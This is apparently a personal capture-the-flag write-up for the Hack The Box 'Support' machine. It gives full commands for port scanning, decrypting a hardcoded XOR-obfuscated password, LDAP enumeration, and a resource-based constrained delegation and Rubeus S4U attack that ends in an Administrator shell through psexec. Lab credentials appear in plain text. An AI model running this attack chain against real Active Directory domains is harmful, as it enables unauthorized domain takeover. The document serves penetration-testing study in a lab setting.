![[Pasted image 20250624092931.png]]

# Enumeration

Look what ports are opens
```bash
nmap -p- --min-rate 10000 -oA nmap/massive_scan 10.129.224.189
Nmap scan report for 10.129.224.189 (10.129.224.189)
Host is up (0.026s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49690/tcp open  unknown
49695/tcp open  unknown
49711/tcp open  unknown

```

take the ports open and run the nmap with `-sVC` flag
```bash
sudo nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49690,49695,49711 10.129.224.189 -oA complete_scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-22 02:24 EDT
Nmap scan report for DC.support.htb0 (10.129.224.189)
Host is up (0.061s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-22 06:24:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-22T06:25:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.80 seconds

```

the hostname `DC` and `support.htb0` are both leaked. I'll update my `hosts` file with `10.129.224.189 DC.support.htb support.htb`

## Shares Enumeration

```bash
smbclient -N -L //support.htb            

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

TODO: Aggiungere come scaricare `iLSpy`

![[Pasted image 20250622103330.png]]

to decrypt the base64 string using XOR algorithm we need the value of **key** variable.
`armando` is the **key** value

![[Pasted image 20250622103439.png]]

XOR have is bidirectional means the same method to chiper the string will be use to decrypt. We can use the same c# fuctions founded in PE file but on my kali machine i prefer to use python. This is my python script to decrypt the pasdword

```python

import base64


base64_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = list("armando".encode())

print(base64_password, '\n')
print(key,'\n') 

print("****************** XOR DECRYPT *************************")

array = base64.b64decode(base64_password)
decrypted = bytearray()

for i in range(len(array)):
	byte = (array[i]^key[i % len(key)]) ^ 0xDF
	decrypted.append(byte)

d = decrypted.decode("utf-8")

print(d)


'''
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
	}
	return Encoding.Default.GetString(array2);
}
'''
```



TODO:
spigare che ho dovuto usare '' perche' altrimenti il dollaro viene preso come variabile

```bash
ldapsearch -H LDAP://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(ObjectClass=Users)"

```



get all'users with ldap query

```bash
ldapsearch -H LDAP://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" '(objectClass=User)' sAMAccountName | grep sAMAccountName
# requesting: sAMAccountName 
sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: DC$
sAMAccountName: krbtgt
sAMAccountName: ldap
sAMAccountName: support
sAMAccountName: smith.rosario
sAMAccountName: hernandez.stanley
sAMAccountName: wilson.shelby
sAMAccountName: anderson.damian
sAMAccountName: thomas.raphael
sAMAccountName: levine.leopoldo
sAMAccountName: raven.clifton
sAMAccountName: bardot.mary
sAMAccountName: cromwell.gerard
sAMAccountName: monroe.david
sAMAccountName: west.laura
sAMAccountName: langley.lucy
sAMAccountName: daughtler.mabel
sAMAccountName: stoll.rachelle
sAMAccountName: ford.victoria

```


```bash
evil-winrm -u "support" -p "Ironside47pleasure40Watchful" --ip support.htb
```
![[Pasted image 20250622105158.png]]

![[Pasted image 20250624074629.png]]



# Privilege Escalation

## Setup bloodhound env

```bash
curl -L https://ghst.ly/getbhce > docker-compose.yml
sudo docker-compose pull && sudo docker-compose up
```

![[Pasted image 20250624000703.png]]


https://breachar.medium.com/install-bloodhound-ce-under-kali-linux-2024-4-2a68feebdb62
## Resource Based Constrained Delegation

### MachineAccountQuota Get-ADObject

```bash
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```
![[Pasted image 20250624074915.png]]
### MachineAccountQuota LDAP

LDAP query to extract the `ms-DS-MachineAccountQuota` from the domain class.
```bash
ldapsearch -H LDAP://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(ObjectClass=domainDNS)" ms-DS-MachineAccountQuota
```


import the `PowerView.ps1` module on the target machine.
```bash
upload PowerView.ps1
```

![[Pasted image 20250624075537.png]]
Once do that we need to verify if the `msds-allowedtoactonbehalfofotheridentity` attribute is empty

```bash
Get-DomainComputer DC | select name,  msds-allowedtoactonbehalfofotheridentity
```

![[Pasted image 20250624075948.png]]

The value is empty, which means we are ready to perform the ***RBCD attack***, but first let's upload the tools
that are required. We will need [PowerMad](https://github.com/Kevin-Robertson/Powermad) and [Rubeus](https://github.com/GhostPack/Rubeus), which we can upload using Evil-WinRM as shown
previously.

Import Powermad.ps1
```bash
upload Powermad.ps1
```

#### Creating a Computer Object
Now, let's create a fake computer and add it to the domain. We can use PowerMad's New-MachineAccount
to achieve this.
```bash
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

![[Pasted image 20250624081609.png]]

We can verify this new machine with the following command
```bash
Get-ADComputer -identity FAKE-COMP01
```

![[Pasted image 20250624081801.png]]
in the output we can see the `SID` of this object.

#### Configure RBCD

Next, we will need to configure Resource-Based Constrained Delegation through one of two ways. We can
either set the PrincipalsAllowedToDelegateToAccount value to FAKE-COMP01 through the builtin
PowerShell Active Directory module, which will in turn configure the msds-
allowedtoactonbehalfofotheridentity attribute on its own, or we can use the PowerView module to
directly set the msds-allowedtoactonbehalfofotheridentity attribute

```bash
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

To verify if the command above worked we can use the `Get-ADComputer` command

```bash
et-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

![[Pasted image 20250624082211.png]]

As we can see, the `PrincipalsAllowedToDelegateToAccount` is set to FAKE-COMP01 , which means the
command worked. 
We can also verify the value of the` msds-allowedtoactonbehalfofotheridentity`.

```bash
Get-DomainComputer -Identity DC | select msds-allowedtoactonbehalfofotheridentity
```

![[Pasted image 20250624082453.png]]

As we can see, the `msds-allowedtoactonbehalfofotheridentity` now has a value, but because the type
of this attribute is `Raw Security Descriptor` we will have to convert the bytes to a string to understand
what's going on.

First, let's grab the desired value and dump it to a variable called **RawBytes**.
```bash
$RawBytes = Get-DomainComputer -Identity DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

Then, let's convert these bytes to a Raw Security Descriptor object.
```bash
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes,0
```

Finally, we can print both the entire security descriptor, as well as the `DiscretionaryAcl` class, **which
represents the Access Control List that specifies the machines that can act on behalf of the DC**

```bash
$Descriptor
$Descriptor.DiscretionaryAcl
```

![[Pasted image 20250624083156.png]]
From the output we can see that the `SecurityIdentifier` is set to the SID of `FAKE-COMP01` that we saw
earlier, and the `AceType` is set to `AccessAllowed` 

### Performing a S4U Attack
t is now time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the
Administrator. We will be using Rubeus to perform this attack.
First, we will need the hash of the password that was used to create the computer object.

```bash
upload Rubeus.exe

.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

![[Pasted image 20250624085040.png]]

We need to grab the value called `rc4_hmac` . Next, we can generate **Kerberos tickets for the Administrator**.

```powershell
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/
dc.support.htb /domain:support.htb /ptt
```


![[Pasted image 20250624085353.png]]


Rubeus successfuly generated the tickets. We can now grab the last Base64 encoded ticket and use it on our
local machine to get a shell on the DC as Administrator . To do so, copy the value of the last ticket and
paste it inside a file called `ticket.kirbi.b64 `. 

> NOTE
> Make sure to remove any whitespace characters from the value.


```bash
tr -d '[:space:]' < ticket.kirbi.b64 > ticket.kirbi.no.whitespace

base64 -d ticket.kirbi.no.whitespace > ticket.kirbi
```

![[Pasted image 20250624090549.png]]

Finally, we can convert this ticket to a format that **Impacket can use**. This can be achieved with Impackets'
`TicketConverter.py` .

```bash
sudo python3 -m venv impacket-env
source impacket-env/bin/activate
```

```bash

sudo apt install git python3-pip -y
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

```bash
cd examples
python3 ticketConverter.py ../../ticket.kirbi ../../ticket.ccache
```


To acquire a shell we can use Impackets' `psexec.py` .

```bash
KRB5CCNAME=../../ticket.ccache python3 psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

![[Pasted image 20250624092635.png]]

find the root flag 

![[Pasted image 20250624092854.png]]